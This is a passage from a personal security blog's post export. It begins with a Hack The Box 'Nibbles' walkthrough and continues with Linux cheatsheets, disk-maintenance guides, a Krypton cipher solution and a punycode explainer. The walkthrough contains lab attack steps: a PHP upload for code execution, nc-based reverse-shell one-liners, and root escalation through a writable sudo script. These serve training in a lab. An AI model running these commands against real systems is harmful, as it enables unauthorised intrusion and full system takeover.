(@firefart)===============================================================[+] Url: http://10.0.0.2/nibbleblog/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/dirb/wordlists/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.5[+] Timeout: 10s===============================================================XXXX/XX/XX XX:XX:XX Starting gobuster in directory enumeration mode===============================================================/.hta (Status: 403) [Size: 304]/.htaccess (Status: 403) [Size: 309]/.htpasswd (Status: 403) [Size: 309]/admin (Status: 301) [Size: 327] [--&gt; http://10.0.0.2/nibbleblog/admin/]/admin.php (Status: 200) [Size: 1401]/content (Status: 301) [Size: 329] [--&gt; http://10.0.0.2/nibbleblog/content/]/index.php (Status: 200) [Size: 2987]/languages (Status: 301) [Size: 331] [--&gt; http://10.0.0.2/nibbleblog/languages/]/plugins (Status: 301) [Size: 329] [--&gt; http://10.0.0.2/nibbleblog/plugins/]/README (Status: 200) [Size: 4628]/themes (Status: 301) [Size: 328] [--&gt; http://10.0.0.2/nibbleblog/themes/]===============================================================READMEIf we check the READMEfile we can see the nibbles blog version in use====== Nibbleblog ======Version: v4.0.3Codename: CoffeeRelease date: 2014-04-01If we look for exploits for nibbleblog we can see that there is one arbitrary file inclusion for the version in use:$ searchsploit nibbleblog --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Nibbleblog 3 - Multiple SQL Injections | php/webapps/35865.txtNibbleblog 4.0.3 - Arbitrary File Upload (Metasploit) | php/remote/38489.rb--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No Resultsadmin.phpWe can see that there is an admin.php page…admin.phpUnfortunately we don’t have valid credentials, and the blog has bruteforcing protection.If we browse to the other paths, we can found a users.xml file in /nibleblog/content/private/.Here, we can found our valid admin user name:&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt;&lt;users&gt; &lt;user username=\"admin\"&gt; &lt;id type=\"integer\"&gt;0&lt;/id&gt; &lt;session_fail_count type=\"integer\"&gt;0&lt;/session_fail_count&gt; &lt;session_date type=\"integer\"&gt;1514544131&lt;/session_date&gt; &lt;/user&gt; &lt;blacklist type=\"string\" ip=\"10.0.10.1\"&gt; &lt;date type=\"integer\"&gt;1512964659&lt;/date&gt; &lt;fail_count type=\"integer\"&gt;1&lt;/fail_count&gt; &lt;/blacklist&gt;&lt;/users&gt;Now, we have a valid admin user name, but we don’t have a password…config.xmlIn the /nibbleblog/content/private/ directory we can found another interesting file: config.xml.If we check the config.xml file, we will not find any password, but we found three mentions of nibbles, one in the notification mail address…&lt;name type=\"string\"&gt;Nibbles&lt;/name&gt;&lt;notification_email_to type=\"string\"&gt;admin@nibbles.com&lt;/notification_email_to&gt;&lt;seo_site_title type=\"string\"&gt;Nibbles - Yum yum&lt;/seo_site_title&gt;FootholdAt this point, with the brute force option ruled out, we should have to take a leap of faith.We will try nibbles as the admin account password.It worked!Nibbleblog admin dashboardIt seems that we can upload files from the section Plugins.So, we can upload a PHP snippet code to verify that we can upload files and if they can be used for code execution.We create a file ce_test.php with the following content:&lt;?php system('id'); ?&gt;Leaving aside a bunch of errors, it seems that the file has been uploaded.The file was uploaded in the /nibbleblog/content/private/plugins/my_image/, but renamed to image.php.Let’s check if we have command execution:$ curl http://10.0.0.2/nibbleblog/content/private/plugins/my_image/image.phpuid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)We have code execution, so we need to obtain a reverse shell. In order to do this, we create a file rs.php with the following bash one-liner reverse shell:&lt;?php system (\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f\"); ?&gt;We upload it again and we can see that is renamed to image.php again.Now we need to start a netcat listener on our host (the attacker):$ nc -lvnp 1234We need curl or browse to our image.php file to execute the reverse shell.Now, we have a reverse shell.The shell we have is not fully interactive, so we will upgrade our shell to a nicer shell.We will use a python one-liner to spawn a pseudo terminal:$ python 3 -c 'import pty; pty.spawn(\"/bin/bash\")'Now, what user we are?$ iduid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)We need to check our sudo privileges.It is something that we should always do, but in this case with more reason, because, if you remember, there’s a sudoers misconfiguration in this box.$ sudo -lsudo: unable to resolve host Nibbles: Connection timed outMatching Defaults entries for nibbler on Nibbles: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser nibbler may run the following commands on Nibbles: (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.shWe can execute /home/nibbler/personal/stuff/monitor.sh as root without password.If we navigate to our home /home/nibbler we can see two files: personal.zip user.txt (Our first flag)If we unzip the personal.zip file we will find the monitor.sh file.$ unzip personal.zipunzip personal.zipArchive: personal.zip creating: personal/ creating: personal/stuff/ inflating: personal/stuff/monitor.sh The monitor.sh file is a bash script and is world-writable.This box has a world-writable file explotation and we can run this script as root without password.Privilege escalationAs monitor.sh is world-writable, we can append a reverse shell one-liner to the end of monitor.sh file and, when we run it, we will have a reverse shell as root.We will append a bash one-liner at the end of monitor.sh:$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1235 &gt;/tmp/f' | tee -a monitor.shWe open a new necat listener on our host (attacker):$ nc -lvnp 1235And we execute the monitor.sh script with sudo in the target (victim) host:$ sudo /home/nibbler/personal/stuff/monitor.shNow, we are root and we can get the root flag stored in /root/root.txtEnjoy! ;)" }, { "title": "ip cheatsheet", "url": "/posts/ip-cheatsheet/", "categories": "gnu/linux, cheatsheets", "tags": "gnu/linux, cheatsheet, ip", "date": "2023-07-02 02:00:01 +0200", "snippet": "I’m an old school guy. I learned to use ifconfigin the old times and, with ifconfig, I continue until today.But, for a while, there is a new contender ip. ip is a network tool called to replace ipc...", "content": "I’m an old school guy. I learned to use ifconfigin the old times and, with ifconfig, I continue until today.But, for a while, there is a new contender ip. ip is a network tool called to replace ipconfig, is installed on all modern gnu/linux distributions, and, it’s more powerful than ipconfig.So, it’s time to learn ip, and, what better way to do it than by keeping a cheeatsheet with the most used commands?Syntaxip [OPTIONS] OBJECT {COMMAND} Display network interfaces informationip addr [show]ip link show Display IPv4 addressesip -4 addrDisplay IPv6 addressesip -6 addrDisplay information from a single network interfaceip addr show dev eth0ip link show eth0 Bring down a network interfaceip link set eth0 upBring down a network interfaceip link set eth0 downAssing an IP address to a network interfacesudo ip address add 10.0.0.1/24 dev eth0Deleting an IP addresssudo ip address del 10.0.0.1/24 dev eth0Enjoy! ;)" }, { "title": "Hack The Box Academy - Completed Operating System Fundamentals", "url": "/posts/htba-operating-system-fundamentals/", "categories": "hack the box, academy, operating systems", "tags": "hack the box, academy", "date": "2023-06-28 02:00:01 +0200", "snippet": "Completed Operating System FundamentalsCompleted Operating System Fundamentals Fundamentals achievement", "content": "Completed Operating System FundamentalsCompleted Operating System Fundamentals Fundamentals achievement" }, { "title": "Hack The Box Academy - Completed Linux Fundamentals", "url": "/posts/htba-linux-fundamentals/", "categories": "hack the box, academy", "tags": "hack the box, academy, linux", "date": "2023-06-23 02:00:01 +0200", "snippet": "Completed Linux FundamentalsCompleted Linux Fundamentals achievement", "content": "Completed Linux FundamentalsCompleted Linux Fundamentals achievement" }, { "title": "Maintain NAND flash drives (SSD) in GNU/Linux", "url": "/posts/maintenance-ssd-gnu-linux/", "categories": "gnu/linux, administration", "tags": "gnu/linux, administration, hdd, nand, usb, ssd, fsck, flash drive", "date": "2023-04-08 02:00:01 +0200", "snippet": "NAND disk ranges from USB flash drives (thumb drive, memory stick, pendrive, call it what you prefer) to SDD (Solid State Drive) disks.Both are based on NAND flash cells.As hard disk drives (HDDs),...", "content": "NAND disk ranges from USB flash drives (thumb drive, memory stick, pendrive, call it what you prefer) to SDD (Solid State Drive) disks.Both are based on NAND flash cells.As hard disk drives (HDDs), NAND disks can suffer several types of failures: logical failures, firmware failures, and bit rot.Since we cannot avoid firmware failures, we will try to avoid (or minimize) bit rot and logical failures.Bit rotTransistors in the flash storage device hold charge which represents data.This charge gradually leaks over time, leading to accumulation of logical errors (also known as “bit rot” or “bit fading”).The only thing we can do to avoid this is plug in periodically our disk or flash drives.The paper, from 2015, “Data Retention in MLC NAND Flash Memory: Characterization, Optimization, and Recovery” from Carnegie Mellon University states “today’s flash devices, which do not require flash refresh, have a typical retention age of 1 year at room temperature”.Logical failuresFlash memory has a finite number of P/E (program/erase) cycles.Although many use a wear leveling strategy to work around these limitations, others don’t.Before a total disk death from usage occurs, some transistors can die from use causing data access errors.MaintenanceThe maintenance process for a SSD disk is the same as in “Maintenance of HDD in GNU/Linux”.But, the maintenance process differs a bit for an USB flash drive.Umount the diskFirst of all is know the device assigned to the disk we want to check.We can know the device assigned using fdisk -l or lsblk.Let’s say our disk is still /dev/sdb.As the disk should be umounted to be able to run fsck, now, we need to umount it:$ sudo umount /dev/sdbCheck badblocksIn an USB flash drive we won’t have S.M.A.R.T. capabilities, so we can skip this step.Besides, as a flash drive is not a disk, a flash drive lacks of a reallocator that marks bad sectors and reallocates its data to spare sectors.So, the best we can do is rely on badblocks. And, as we will use 2fsck, we will use badblocks through the fsck -cc option.$ sudo fsck -fccy /dev/sdb1Using the -cc option, any existing bad blocks in the bad blocks list are preserved, and any new bad blocks found by running badblocks will be added to the existing bad blocks list.Besides, with -cc option the bad block scan will be done using a non-destructive read-write test.We could have also do it with e2fsck or badblocks directly:$ sudo e2fsck -fccy /dev/sdb1$ sudo badblocks -nsv /dev/sdb1Check badblocks resultsTo see the blocks marked as bad in a ext2/ext3/ext4 filesystem we have to use dumpe2fs:$ sudo dumpe2fs -b /dev/sdb1Enjoy! ;)" }, { "title": "Maintain HDD in GNU/Linux", "url": "/posts/maintenance-hdd-gnu-linux/", "categories": "gnu/linux, administration", "tags": "gnu/linux, administration, hdd, smartmontools, smartctl, fsck", "date": "2023-03-17 01:00:01 +0100", "snippet": "A hard disk drive (HDD) can suffer several types of failures: logical failures, mechanical failures or firmware failures.Since we cannot avoid mechanical or firmware failures, we will try to avoid ...", "content": "A hard disk drive (HDD) can suffer several types of failures: logical failures, mechanical failures or firmware failures.Since we cannot avoid mechanical or firmware failures, we will try to avoid (or minimize) logical failures.It’s a good practice to check the health of your HDD (Hard Disk Drives) from time to time and repair them if neccesary.It will avoid a lot of data loss and headaches.The process can take anywhere from a few minutes to a few hours, but it’s worth it.Also, unless it is your main HDD, you can continue working while the disk is being checked and fixed.How can we check and fix our HDD in GNU/linux?Umount the diskFirst of all is know the device assigned to the disk we want to check.We can know the device assigned using fdisk -l or lsblk.Let’s say our disk is /dev/sdb.As the disk should be umounted to be able to run fsck, now, we need to umount it:$ sudo umount /dev/sdbCheck hard drive health using smartctlsmartctl is a utility contained on the smartmontools package.smartctl serves for check the HDD S.M.A.R.T. (Self-Monitoring Analysis and Reporting Technology) attributes and is the utility that we’ll use for run some tests and check our HDD overall status.Check if SMART is enabled$ sudo smartctl -i /dev/sdb | grep support Our output should be:SMART support is: Available - device has SMART capability.SMART support is: EnabledBut, if our disk has SMART available and disabled, we should enable it with:$ sudo smartctl -s on /dev/sdbCheck the disk status$ sudo smartctl -a /dev/sdaThere’s a lot of info displayed, but we should pay special attention to the next fields: Reallocated_Sector_Ct (Reallocated Sectors Count): The raw value represents a count of the bad sectors that have been found and remapped. Power_On_Hours: Count of hours in power-on state. It’s not useful to check for errors, but it’s useful to get an idea of the hours of life that the disk has left. Reported_Uncorrect: Reported Uncorrectable Errors. The count of errors that could not be recovered using hardware. Current_Pending_Sector: Count of “unstable” sectors (waiting to be remapped, because of unrecoverable read errors).If the RAW_VALUE is greater than 0 for any of these fields, we should backup our files (if necessary) and we should fix the disk later.Estimate the test timeThe smartctl utility can perform a variety of tests: offline: A short foreground test of less than two minutes. short: Runs SMART Short Self Test (usually under ten minutes). long: A more accurate version of the “short” test. Could take a few hours. conveyance: Checks for possible damages occurred during the transportation of the device. Should take a few minutes.And we can known the estimated duration of the tests executing:$ sudo smartctl -c /dev/sdbTest the diskI prefer to run the long test as it will give us a better overall disk health.$ sudo smartctl -t long /dev/sdbOnce executed, smartctl will give us the neccesary time to complete the test:Please wait 303 minutes for test to complete.And, we can always cancel the test execution:Use smartctl -X to abort test.After the time specified by smartctl we can check the test results with:$ sudo smartctl -a /dev/sdbor$ sudo smartctl -l selftest /dev/sdbFix the filesystem using fsck The disk should be umounted to be able to run fsckfsck (File System Consistency Check) comes by default on GNU/Linux distributions.fsck is used to check to check and, optionally, repair one or more Linux filesystems.Check the partitionsLet’s say we want repair our /dev/sdb1 partition.Sometimes the disk is marked as clean, but we know for sure that the disk has some damage, because we had errors using it.So, we can force a check on the partition:$ sudo fsck -f /dev/sdb1Don’t worry, this test is fast ;)Fix the filesystem automaticallyThe most confortable wat to repair the this is do it in “autopilot mode” or automatically.We can do this in two ways: Automatic repair (no questions): $ sudo fsck -p /dev/sdb1 Assume “yes” to all questions: $ sudo fsck -y /dev/sdb1 Enjoy! ;)" }, { "title": "Overthewire krypton level 6 LFSR", "url": "/posts/overthewire-krypton-level-6-lfsr/", "categories": "overthewire, krypton", "tags": "overthewire, krypton, lfsr, cryptography", "date": "2023-03-03 01:00:01 +0100", "snippet": "Some time ago I started to solve the Krypton game from OverTheWire.I did a walkthrough about Kripton Level 4 and Krypton Level 5.At this point, the only level that I had to solve was the Krypton L...", "content": "Some time ago I started to solve the Krypton game from OverTheWire.I did a walkthrough about Kripton Level 4 and Krypton Level 5.At this point, the only level that I had to solve was the Krypton Level 6.This level consists in break a stream cipher.And, as the statement warns, “The challenge here is not simple”.Level Info Hopefully by now its obvious that encryption using repeating keys is a bad idea. Frequency analysis can destroy repeating/fixed key substitution crypto. A feature of good crypto is random ciphertext. A good cipher must not reveal any clues about the plaintext. Since natural language plaintext (in this case, English) contains patterns, it is left up to the encryption key or the encryption algorithm to add the ‘randomness’. Modern ciphers are similar to older plain substitution ciphers, but improve the ‘random’ nature of the key. An example of an older cipher using a complex, random, large key is a vigniere using a key of the same size of the plaintext. For example, imagine you and your confident have agreed on a key using the book ‘A Tale of Two Cities’ as your key, in 256 byte blocks. The cipher works as such: Each plaintext message is broken into 256 byte blocks. For each block of plaintext, a corresponding 256 byte block from the book is used as the key, starting from the first chapter, and progressing. No part of the book is ever re-used as key. The use of a key of the same length as the plaintext,and only using it once is called a “One Time Pad”. Look in the krypton6 directory. You will find a file called ‘plain1’, a 256 byte block. You will also see a file ‘key1’, the first 256 bytes of ‘A Tale of Two Cities’.The file ‘cipher1’ is the cipher text of plain1. As you can see (and try) it is very difficult to break the cipher without the key knowledge. If the encryption is truly random letters, and only used once, then it is impossible to break. A truly random “One Time Pad” key cannot be broken.Consider intercepting a ciphertext message of 1000 bytes. One could brute force for the key, but due to the random key nature,you would produce every single valid 1000 letter plaintext as well. Who is to know which is the real plaintext?!? Choosing keys that are the same size as the plaintext is impractical. Therefore, other methods must be used to obscure ciphertext against frequency analysis in a simple substitution cipher. The impracticality of an ‘infinite’ key means that the randomness, or entropy, of the encryption is introduced via the method. We have seen the method of ‘substitution’. Even in modern crypto, substitution is a valid technique. Another technique is ‘transposition’, or swapping of bytes. Modern ciphers break into two types; symmetric and asymmetric. Symmetric ciphers come in two flavours: block and stream. Until now, we have been playing with classical ciphers, approximating ‘block’ ciphers. A block cipher is done in fixed size blocks (suprise!). For example, in the previous paragraphs we discussed breaking text and keys into 256 byte blocks, and working on those blocks.Block ciphers use a fixed key to perform substituion and transposition ciphers on each block discretely. Its time to employ a stream cipher. A stream cipher attempts to create an on-the-fly ‘random’ keystream to encrypt the incoming plaintext one byte at a time.Typically, the ‘random’ key byte is xor’d with the plaintext to produce the ciphertext. If the random keystream can be replicated at the recieving end,then a further xor will produce the plaintext once again. From this example forward, we will be working with bytes, not ASCII text, so a hex editor/dumper like hexdump is a necessity.Now is the right time to start to learn to use tools like cryptool. In this example, the keyfile is in your directory, however it is not readable by you. The binary ‘encrypt6’ is also available.It will read the keyfile and encrypt any message you desire, using the key AND a ‘random’ number.You get to perform a ‘known ciphertext’ attack by introducing plaintext of your choice.The challenge here is not simple, but the ‘random’ number generator is weak. As stated, it is now that we suggest you begin to use public tools, like cryptool, to help in your analysis.You will most likely need a hint to get going. See ‘HINT1’ if you need a kicktstart. If you have further difficulty, there is a hint in ‘HINT2’. The password for level 7 (krypton7) is encrypted with ‘encrypt6’. Good Luck!What do we know so far about this level? It’s a symmetric cipher It’s a stream cipher where the “random” key byte (k) is xor’d with the plain text (pt) to produce the ciphertext (ct):k ⊕ pt = ct k is a “random“ keystream. If the random keystream (k) can be replicated at the recieving end, then a further xor will produce the plaintext once again:k ⊕ pt = ct → pt ⊕ ct = k We will working with bytes. encrypt6 will read the keyfile and encrypt any message using the key AND a “random“ number. We have to perfom a known ciphertext attack The random number generator is weak. The password for Krypton Level 7 is encrypted with encrypt6.What can we learn from the clues?HINT1 The ‘random’ generator has a limited number of bits, and is periodic.Entropy analysis and a good look at the bytes in a hex editor will help.There is a pattern!HINT2 8 bit LFSRLFSRLFSR is used as a pseudo-random number generator for use in stream ciphers, but, as the register has a fine number of pssible states it must eventually enter a repeating cycle.This means that the numbers generated are periodic. A maximum-length LFSR will produce an m-secuence, so a 8 bit LFSR will produce a 8 bit sequence. The most commonly used linear function of single bits is exclusive-or (XOR ⊕). Thus, an LFSR is most often a shift register whose input bit is driven by the XOR of some bits of the overall shift register value. Given a stretch of known plaintext and corresponding ciphertext, an attacker can intercept and recover a stretch of LFSR output stream used in the system described, and from that stretch of the output stream can construct an LFSR of minimal size that simulates the intended receiver by using the Berlekamp-Massey algorithm. This LFSR can then be fed the intercepted stretch of output stream to recover the remaining plaintext.LFSR works by feeding on their own output.They are constructed in a way that makes them endlessly cycle through a pattern of values while outputting that seemingly random pattern.There’s a very graphic and good explanation about how a LFSR works in Random Numbers with LFSR (Linear Feedback Shift Register) - Computerphile.The journey to solutionFail 1From the properties of XOR we know that:plaintext ⊕ key = ciphertext → ciphertext ⊕ key = plaintextAnd we know that:p ⊕ 0 = pBecause: p 0 p⊕0 0 0 0 1 0 1 So, If we put a bunch of zeros as input, we’ll get the key directly:plaintext ⊕ key = ciphertext → 0 ⊕ key = ciphertext → 0 ⊕ key = key → key = ciphertextkrypton6@bandit:/tmp/rubenhortas$ ln -s /krypton/krypton6/keyfile.dat krypton6@bandit:/tmp/rubenhortas$ python3 -c \"print('0'*50)\" &gt; zeros_pt.txtkrypton6@bandit:/tmp/rubenhortas$ /krypton/krypton6/encrypt6 zeros_pt.txt zeros_ct.txtAnd our key is… An empty file! FAIL 1!Fail 2Ok, encrypt6 doesn’t seem to work with numbers, so let’s try with letters…krypton6@bandit:/tmp/rubenhortas$ python3 -c \"print('A'*50)\" &gt; as_pt.txtkrypton6@bandit:/tmp/rubenhortas$ /krypton/krypton6/encrypt6 as_pt.txt as_ct.txtkrypton6@bandit:/tmp/rubenhortas$ cat as_pt.txt AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAkrypton6@bandit:/tmp/rubenhortas$ cat as_ct.txt EICTDGYIYZKTHNSIRFXYCPFUEOCKRNEICTDGYIYZKTHNSIRFXYkrypton6@bandit:/tmp/rubenhortas$ python3 -c \"print('B'*50)\" &gt; bs_pt.txtkrypton6@bandit:/tmp/rubenhortas$ /krypton/krypton6/encrypt6 bs_pt.txt bs_ct.txtkrypton6@bandit:/tmp/rubenhortas$ cat bs_pt.txt BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBkrypton6@bandit:/tmp/rubenhortas$ cat bs_ct.txt FJDUEHZJZALUIOTJSGYZDQGVFPDLSOFJDUEHZJZALUIOTJSGYZkrypton6@bandit:/tmp/rubenhortas$ python3 -c \"print('C'*50)\" &gt; cs_pt.txtkrypton6@bandit:/tmp/rubenhortas$ /krypton/krypton6/encrypt6 cs_pt.txt cs_ct.txtkrypton6@bandit:/tmp/rubenhortas$ cat cs_pt.txt CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCkrypton6@bandit:/tmp/rubenhortas$ cat cs_ct.txt GKEVFIAKABMVJPUKTHZAERHWGQEMTPGKEVFIAKABMVJPUKTHZAWe can see some curious things: If we encrypt the same input (or plaintext) many times we’ll see the same output (or ciphertext) → We can forget about the random part for the key The ciphertext will be repeated from the 30th character → The key will have a max length of 30 characters For example, the as_ct.txt: EICTDGYIYZKTHNSIRFXYCPFUEOCKRNEICTDGYIYZKTHNSIRFXY → → EICTDGYIYZKTHNSIRFXYCPFUEOCKRN → EICTDGYIYZKTHNSIRFXY So, we can short our plaintexts and ciphertexts to 30, to make our work easier: Plaintext Ciphertext AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA EICTDGYIYZKTHNSIRFXYCPFUEOCKRN BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB FJDUEHZJZALUIOTJSGYZDQGVFPDLSO CCCCCCCCCCCCCCCCCCCCCCCCCCCCCC GKEVFIAKABMVJPUKTHZAERHWGQEMTP At this point I think the LFSR isn’t well tapped and it’s not giving a maximum cycle and period. The ciphertext has the same length than the plaintext → Our ciphertext has 15 characters, so we need, at least, a 15 characters key.The first thing is to get the keys for our three ciphers and compare if they are the same.We’ll get the keys xoring the plaintext with the ciphertext, because:plaintext ⊕ key = ciphertext → key = plaintext ⊕ ciphertextThe keys:as_key: b'\\x04\\x08\\x02\\x15\\x05\\x06\\x18\\x08\\x18\\x1b\\n\\x15\\t\\x0f\\x12\\x08\\x13\\x07\\x19\\x18\\x02\\x11\\x07\\x14\\x04\\x0e\\x02\\n\\x13\\x0f'bs_key: b'\\x04\\x08\\x06\\x17\\x07\\n\\x18\\x08\\x18\\x03\\x0e\\x17\\x0b\\r\\x16\\x08\\x11\\x05\\x1b\\x18\\x06\\x13\\x05\\x14\\x04\\x12\\x06\\x0e\\x11\\r'cs_key: b'\\x04\\x08\\x06\\x15\\x05\\n\\x02\\x08\\x02\\x01\\x0e\\x15\\t\\x13\\x16\\x08\\x17\\x0b\\x19\\x02\\x06\\x11\\x0b\\x14\\x04\\x12\\x06\\x0e\\x17\\x13'Ok, the keys are different… FAIL 2!SolutionSo now, we know that the function is deterministic, it always will give the same output (or ciphertext) for a given input (or plaintext), and the key will depend on the input (or the plaintext).If we take a closer look to the plaintexts and the ciphertexts we can see that when we increment by one character our input (or plaintext),the output (or ciphertext) will also be increased by one character. Plaintext Ciphertext AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA EICTDGYIYZKTHNSIRFXYCPFUEOCKRN BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB FJDUEHZJZALUIOTJSGYZDQGVFPDLSO CCCCCCCCCCCCCCCCCCCCCCCCCCCCCC GKEVFIAKABMVJPUKTHZAERHWGQEMTP So, we can asume that the difference between the plaintext and the ciphertext will be constant.I think, at this point we can solve this challenge with linear cryptanalysis, differential cryptanalisys or Berlekamp–Massey algorithm…I don’t know for sure.I was researching (and reading algebraic theories beyond my means) when I did another test that gave me a clue to find a easier solution:krypton6@bandit:/tmp/rubenhortas$ echo \"ABC\" &gt; abc_pt.txtkrypton6@bandit:/tmp/rubenhortas$ /krypton/krypton6/encrypt6 abc_pt.txt abc_ct.txtkrypton6@bandit:/tmp/rubenhortas$ cat abc_pt.txt ABCkrypton6@bandit:/tmp/rubenhortas$ cat abc_ct.txt EJEWe can see that when encrypting a plaintext character in a certain position, it always give the same exact encrypted character in the same exact position… Plaintext Ciphertext A E B FJ CCC GKE ABC EJE So I did a 26x30 matrix encrypting every english alphabet character 30 times (the length of the LFSR period).And the plaintext password for the Krypton Level 7 will be the result of find the plaintext character corresponding to the encrypted character in the corresponding position in our matrix:   P N U K L Y L W R Q K G K B E … A E I C T D G Y I Y Z K T H N S IRFXYCPFUEOCKRN B F J D U E H Z J Z A L U I O T JSGYZDQGVFPDLSO C G K E V F I A K A B M V J P U KTHZAERHWGQEMTP D H L F W G J B L B C N W K Q V LUIABFSIXHRFNUQ E I M G X H K C M C D O X L R W MVJBCGTJYISGOVR F J N H Y I L D N D E P Y M S X NWKCDHUKZJTHPWS G K O I Z J M E O E F Q Z N T Y OXLDEIVLAKUIQXT H L P J A K N F P F G R A O U Z PYMEFJWMBLVJRYU I M Q K B L O G Q G H S B P V A QZNFGKXNCMWKSZV J N R L C M P H R H I T C Q W B RAOGHLYODNXLTAW K O S M D N Q I S I J U D R X C SBPHIMZPEOYMUBX L P T N E O R J T J K V E S Y D TCQIJNAQFPZNVCY M Q U O F P S K U K L W F T Z E UDRJKOBRGQAOWDZ N R V P G Q T L V L M X G U A F VESKLPCSHRBPXEA O S W Q H R U M W M N Y H V B G WFTLMQDTISCQYFB P T X R I S V N X N O Z I W C H XGUMNREUJTDRZGC Q U Y S J T W O Y O P A J X D I YHVNOSFVKUESAHD R V Z T K U X P Z P Q B K Y E J ZIWOPTGWLVFTBIE S W A U L V Y Q A Q R C L Z F K AJXPQUHXMWGUCJF T X B V M W Z R B R S D M A G L BKYQRVIYNXHVDKG U Y C W N X A S C S T E N B H M CLZRSWJZOYIWELH V Z D X O Y B T D T U F O C I N DMASTXKAPZJXFMI W A E Y P Z C U E U V G P D J O ENBTUYLBQAKYGNJ X B F Z Q A D V F V W H Q E K P FOCUVZMCRBLZHOK Y C G A R B E W G W X I R F L Q GPDVWANDSCMAIPL Z D H B S C F X H X Y J S G M R HQEWXBOETDNBJQM And we got our password for the Krypton Level 7!Well, it may be not the most orthodox solution, and, maybe, some day, I’ll try to solve it by linear cryptanalysis, differential cryptanalisys or Berlekamp–Massey algorithm, but it’s a solution :PEnjoy! ;)" }, { "title": "Space Rogue How the hackers known as l0pht changed the world", "url": "/posts/space-rogue-how-the-hackers-known-as-l0pht-changed-the-world/", "categories": "personal, cryptography", "tags": "personal, cryptography, l0pht, space rogue", "date": "2023-03-01 01:00:01 +0100", "snippet": "These days I read the Chris Thomas’ book: Space Rogue How the hackers known as l0pht changed the world.It is a great book and I recommend it. It’s very entertaining and reads very quickly.It was ju...", "content": "These days I read the Chris Thomas’ book: Space Rogue How the hackers known as l0pht changed the world.It is a great book and I recommend it. It’s very entertaining and reads very quickly.It was just as interesting for me to learn about l0pht’s history and philosophy on computer security as it was about Space Rogue’s history and personal anecdotes.It was also an exercise in nostalgia to remember those not-so-old days.The truth is that I spent a few hours enjoying it completely abstracted from everything :)The fact is that on the front and back covers this binary code appears:01001101011000010110101101101001011011100110011100100000011101000110100001100101001000000111010001101000011001010110111101110010011001010111010001101001011000110110000101101100001000000111000001110010011000010110001101110100011010010110001101100001011011000010000001110011011010010110111001100011011001010010000000110001001110010011100100110010After reading the book, and knowing (a bit) about Space Rogue and the l0pht people, it could not be simple gibberish.So, I took a while and started to transcribe and decipher it, and the result is:Making the theoretical practical since 1992Enjoy! ;)" }, { "title": "Windows 10 and 11 cheatsheet", "url": "/posts/windows-10-11-cheatsheet/", "categories": "windows, cheatsheets", "tags": "windows, windows10, windows11, cheatsheet", "date": "2023-02-10 01:00:01 +0100", "snippet": "Useful shortcuts for Windows 10 and 11 [WIN] + d Hide apps and show desktop or vice versa. [WIN] + e Open file explorer. [WIN] + l Lock session. [WIN] + r Show the run box. [WIN] + t Cycle thr...", "content": "Useful shortcuts for Windows 10 and 11 [WIN] + d Hide apps and show desktop or vice versa. [WIN] + e Open file explorer. [WIN] + l Lock session. [WIN] + r Show the run box. [WIN] + t Cycle through the apps in the task list. [WIN] + v Show clipboard history. [WIN] + x Open the right click options of the Start menu. [WIN] + [CTRL] + [←] / [→] Cycle through virtual desktops. [WIN] + [←] / [→] Adjust window size. [WIN] + [↑] Maximize window. [WIN] + [↓] Minimize window. [WIN] + [TAB] Open task list. [SHIFT] + [DEL] Delete selected item without sending it to the trash. I only put the most useful shortcuts for me. If you want to know more windows shortcuts you can start reding Keyboard shortcuts in Windows.Enjoy! ;)" }, { "title": "Hack The Box - Bashic Calculator pwned!", "url": "/posts/htb-bashic-calculator/", "categories": "hack the box, challenge", "tags": "hack the box, challenge, bashic calculator", "date": "2023-01-28 01:00:01 +0100", "snippet": "Description I’ve made the coolest calculator. It’s pretty simple, I don’t need to parse the input and take care of execution order, bash does it for me!I’ve also made sure to remove characters lik...", "content": "Description I’ve made the coolest calculator. It’s pretty simple, I don’t need to parse the input and take care of execution order, bash does it for me!I’ve also made sure to remove characters like $ or ` to not allow code execution, that will surely be enough.Bashic Calculator has been PwnedEnjoy! ;)" }, { "title": "How to avoid punycode attacks on firefox", "url": "/posts/how-to-avoid-punycode-attacks-firefox/", "categories": "hardening, firefox", "tags": "hardening, firefox, punycode", "date": "2023-01-07 01:00:01 +0100", "snippet": "What is punycode?Punycode is a representation of Unicode with the limited ASCII character subset used for Internet hostnames.Using punycode host names containing Unicode characters are transcoded t...", "content": "What is punycode?Punycode is a representation of Unicode with the limited ASCII character subset used for Internet hostnames.Using punycode host names containing Unicode characters are transcoded to a subset of ASCII consisting of letters, digits and hypens, which is called LHD (Letter Digit Hypen) subset.The DNS (Domain Name System) standards recommend the use of the LDH subset of ASCII.the punycode syntax is a method of encoding string containign Unicode characters into the LDH subset of ASCII.In other words, punycode is a method to convert words that can’t be written in ASCII (because they use Unicode characters) into ASCII encoding words for use as domain names.For example: UTF8 Punycode rubénhortas.github.io https://xn–rubnhortas-d7a.github.io What is a punycode attack?A punycode attack is a type of homograph attack.Some unicode characters are very similiar to ASCII characters, making them difficult to distinguish with the naked eye.As the security researcher Xudong Zheng demonstrates on his post Phishing with Unicode Domains it’s possible to register domains such as “xn–pple-43d.com”, which is equivalent to 